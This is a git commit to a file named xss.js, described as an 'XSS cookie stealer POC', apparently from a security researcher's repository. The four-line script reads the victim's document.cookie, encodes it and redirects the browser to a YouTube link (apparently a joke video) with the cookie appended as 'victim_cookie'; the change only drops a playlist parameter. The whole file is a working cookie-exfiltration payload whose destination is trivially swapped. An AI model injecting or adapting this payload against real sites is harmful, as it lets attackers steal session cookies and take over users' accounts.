810d8327ec5cbbe3016602b81bad6fd0c0b190a7
ayuxsec <ayuxsec@proton.me>
2026-02-16 14:52:11 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
 // XSS cookie stealer POC
 var cookie = encodeURIComponent(document.cookie);
-var url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&victim_cookie=' + cookie;
+var url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&victim_cookie=' + cookie;
 window.location.href = url;
